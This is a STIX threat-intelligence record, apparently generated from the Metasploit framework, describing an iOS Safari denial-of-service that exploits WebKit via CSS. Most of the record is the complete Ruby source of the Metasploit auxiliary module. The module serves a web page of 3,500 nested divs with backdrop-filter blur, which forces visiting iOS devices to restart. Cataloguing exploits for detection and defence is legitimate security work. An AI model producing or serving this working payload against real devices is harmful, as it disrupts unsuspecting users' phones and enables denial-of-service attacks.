{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ca8c3a61-d8e1-4938-970d-4a83e3682f06",
    "created": "2024-08-14T16:25:01.499319Z",
    "modified": "2024-08-14T16:25:01.499323Z",
    "name": "\"iOS Safari Denial of Service with CSS\"",
    "description": "( This module exploits a vulnerability in WebKit on Apple iOS. If successful, the device will restart after viewing the webpage. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/apple_ios/webkit_backdrop_filter_blur.rb",
            "external_id": "webkit_backdrop_filter_blur.rb"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/pwnsdx/status/1040944750973595649"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/pwnsdx/ce64de2760996a6c432f06d612e33aea"
        },
        {
            "source_name": "reference",
            "url": "https://nbulischeck.github.io/apple-safari-crash"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => \"iOS Safari Denial of Service with CSS\",\n        'Description'    => %q(\n          This module exploits a vulnerability in WebKit on Apple iOS.\n          If successful, the device will restart after viewing the webpage.\n        ),\n        'License'        => MSF_LICENSE,\n        'Author'         => [\n          'Sabri Haddouche', # twitter.com/pwnsdx\n        ],\n        'References'     => [\n          ['URL', 'https://twitter.com/pwnsdx/status/1040944750973595649'],\n          ['URL', 'https://gist.github.com/pwnsdx/ce64de2760996a6c432f06d612e33aea'],\n          ['URL', 'https://nbulischeck.github.io/apple-safari-crash'],\n        ],\n        'DisclosureDate' => '2018-09-15',\n      )\n    )\n  end\n\n  def run\n    exploit\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"#{cli.peerhost}: Sending response to User-Agent: #{request['User-Agent']}\")\n    html = %|\n<html>\n <head>\n  <meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\"/>\n  <style>\n    div {\n      backdrop-filter: blur(10px);\n      -webkit-backdrop-filter: blur(10px);\n      width:10000px; height:10000px;\n    }\n  </style>\n </head>\n <body>\n #{'<div>' * 3500 + '</div>' * 3500}\n </body>\n</html>\n|\n    send_response(cli, html)\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-09-15"
}